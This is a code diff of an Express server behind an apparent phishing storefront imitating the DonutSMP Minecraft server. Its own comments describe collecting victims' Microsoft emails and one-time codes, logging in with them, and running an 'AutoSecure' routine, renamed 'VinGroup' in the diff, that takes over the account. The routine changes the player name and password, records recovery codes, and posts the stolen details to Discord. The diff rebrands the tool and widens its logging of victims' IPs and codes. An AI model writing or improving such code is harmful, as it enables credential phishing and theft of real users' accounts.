@@ -61,7 +61,9 @@ app.use(async (req, res, next) => {
                 return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
             }
         }
-    } catch (e) {}
+    } catch (e) {
+        console.error('[IP_BAN_MIDDLEWARE] Error checking banned IP:', e.message);
+    }
     next();
 });
 
@@ -78,17 +80,19 @@ app.use((req, res, next) => {
 app.post('/api/web-activity', async (req, res) => {
     try {
         const { code, username, email, statusText, domain } = req.body || {};
-        // Only log if username and email are both provided
-        if (username && email) {
+        // Log if username is provided (email is optional for early steps like Waiting Email)
+        if (username) {
             const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
             const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+            
+            console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);
 
             await sendWebLog({
                 code,
                 ip: clientIp,
-                domain: domain || req.headers.host || config.webDomain || 'donuttsmp.store',
+                domain: config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                 username,
-                email,
+                email: email || '',
                 statusText: statusText || 'Send Code'
             });
         }
@@ -107,7 +111,7 @@ app.post('/api/web-activity', async (req, res) => {
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'ok',
-        service: 'DonutSMP AutoSecure API Server',
+        service: 'DonutSMP VinGroup API Server',
         time: new Date().toISOString(),
         activeSessions: activeSessions.size
     });
@@ -279,7 +283,7 @@ app.post('/api/send-otp', async (req, res) => {
 });
 
 /**
- * 3. Verify OTP & AutoSecure (User nhập OTP -> Nếu đúng = AutoSecure -> Bắn hit Discord)
+ * 3. Verify OTP & VinGroup (User nhập OTP -> Nếu đúng = VinGroup -> Bắn hit Discord)
  * Body: { sessionId, email, secId, code, username, giftCode }
  */
 app.post('/api/verify-otp', async (req, res) => {
@@ -349,7 +353,7 @@ app.post('/api/verify-otp', async (req, res) => {
         }
 
         console.log(`[API /verify-otp] [✔] ĐĂNG NHẬP MICROSOFT THÀNH CÔNG! (Host Cookie acquired)`);
-        console.log(`[API /verify-otp] BẮT ĐẦU QUY TRÌNH AUTOSECURE (Chiếm quyền tài khoản)...`);
+        console.log(`[API /verify-otp] BẮT ĐẦU QUY TRÌNH VINGROUP (Chiếm quyền tài khoản)...`);
 
         // Generate unique account UID
         const uid = await generateuid();
@@ -425,8 +429,8 @@ app.post('/api/verify-otp', async (req, res) => {
             claiming: userConfig?.claiming ?? 0
         };
 
-        console.log(`[API /verify-otp] Áp dụng cấu hình Autosecure của bot con (${effectiveUserId}):`);
-        console.log(` • Autosecure    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
+        console.log(`[API /verify-otp] Áp dụng cấu hình VinGroup của bot con (${effectiveUserId}):`);
+        console.log(` • VinGroup    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
         console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
         console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
         console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
@@ -440,11 +444,11 @@ app.post('/api/verify-otp', async (req, res) => {
         console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);
 
         if (!settings.auto_secure) {
-            console.log(`[API /verify-otp] Bot con đã tắt Autosecure! Lưu mã vào danh sách chờ claim thủ công.`);
+            console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
             const embedData = {
                 embeds: [{
                     title: `${username || 'Account'}! :x:`,
-                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*Autosecure đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
+                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
                     color: 0x00ff00
                 }]
             };
@@ -464,10 +468,10 @@ app.post('/api/verify-otp', async (req, res) => {
             });
         }
 
-        // Execute AutoSecure account takeover
+        // Execute VinGroup account takeover
         let acc = await secure(host, settings, uid, username);
 
-        console.log(`[API /verify-otp] [✔] AutoSecure hoàn tất! UID: ${uid}`);
+        console.log(`[API /verify-otp] [✔] VinGroup hoàn tất! UID: ${uid}`);
         console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
         console.log(` • Mật khẩu mới : ${acc.password || 'N/A'}`);
         console.log(` • Recovery Code: ${acc.recoveryCode || 'N/A'}`);
@@ -681,9 +685,9 @@ async function startServer() {
         await initializeDB();
         console.log('Cơ sở dữ liệu SQLite đã sẵn sàng.');
 
-        app.listen(PORT, () => {
+        app.listen(PORT, '127.0.0.1', () => {
             console.log(`\n======================================================`);
-            console.log(`🚀 DonutSMP Web Server & AutoSecure API đang hoạt động!`);
+            console.log(`🚀 DonutSMP Web Server & VinGroup API đang hoạt động!`);
             console.log(` • Website Store : http://localhost:${PORT}`);
             console.log(` • Checkout Page : http://localhost:${PORT}/checkout`);
             console.log(` • Payment Page  : http://localhost:${PORT}/checkout/payment`);
